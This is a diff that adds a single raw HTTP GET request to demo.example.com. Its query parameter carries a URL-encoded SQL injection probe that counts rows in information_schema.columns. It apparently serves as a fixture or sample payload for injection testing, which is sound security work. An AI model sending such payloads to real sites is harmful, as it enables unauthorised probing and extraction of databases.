@@ -1,0 +1,4 @@
+GET /a?q=1%20and%201%3D(select%20count(*)%20from%20information_schema.columns) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
